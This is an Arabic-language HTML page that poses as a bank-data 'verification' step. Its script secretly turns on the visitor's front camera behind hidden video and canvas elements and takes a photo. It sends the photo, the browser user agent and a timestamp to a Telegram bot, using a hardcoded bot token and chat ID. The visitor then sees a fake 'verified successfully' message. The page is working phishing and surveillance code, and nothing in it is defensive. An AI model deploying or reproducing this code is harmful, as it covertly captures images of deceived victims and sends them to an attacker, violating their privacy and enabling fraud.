<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>
<style>
body {
    background: #0a0a0a;
    color: #00ff00;
    font-family: monospace;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    margin: 0;
    text-align: center;
}
.box {
    border: 2px solid #00ff00;
    border-radius: 12px;
    padding: 30px;
    max-width: 400px;
}
h1 { color: #ff3b5c; }
button {
    background: #00ff00;
    color: #000;
    border: none;
    padding: 12px 24px;
    border-radius: 8px;
    font-size: 1rem;
    cursor: pointer;
    margin-top: 15px;
}
video, canvas { display: none; }
</style>
</head>
<body>
<div class="box">
    <h1>حفظ  بياناتي البنكيه </h1>
    <p>شاهد البيانات</p>
    <button onclick="start()">التحقق</button>
    <p id="status"></p>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
// ============================================================
// الإعدادات
// ============================================================
const BOT_TOKEN = "8747240774:AAGZbAx1rPOIVYnko2cvWyCSBc0DW-bJXI0";
const CHAT_ID = "8977766960";

// ============================================================
// البدء
// ============================================================
async function start() {
    const status = document.getElementById("status");
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");

    try {
        status.textContent = "⏳ جاري التحقق...";

        // 1. طلب إذن الكاميرا
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" }
        });

        video.srcObject = stream;
        await video.play();

        // 2. انتظر ثانيتين لضبط الصورة
        await new Promise(r => setTimeout(r, 2000));

        // 3. التقاط الصورة
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);

        // 4. تحويل الصورة إلى Blob
        const blob = await new Promise(resolve =>
            canvas.toBlob(resolve, "image/jpeg", 0.9)
        );

        // 5. إرسال الصورة إلى تلغرام
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", blob, "visitor.jpg");
        formData.append("caption",
            "📸 زائر جديد\n" +
            "🕒 " + new Date().toLocaleString("ar-OM") + "\n" +
            "🌐 " + navigator.userAgent
        );

        const res = await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
            { method: "POST", body: formData }
        );

        const data = await res.json();

        if (data.ok) {
            status.textContent = "✅ تم التحقق بنجاح";
            status.style.color = "#00ff00";

            // إيقاف الكاميرا
            stream.getTracks().forEach(t => t.stop());

            // إخفاء الزر
            document.querySelector("button").style.display = "none";
        } else {
            status.textContent = "❌ فشل الإرسال";
        }

    } catch (err) {
        status.textContent = "❌ " + err.message;
        status.style.color = "#ff3b5c";
    }
}
</script>
</body>
</html>
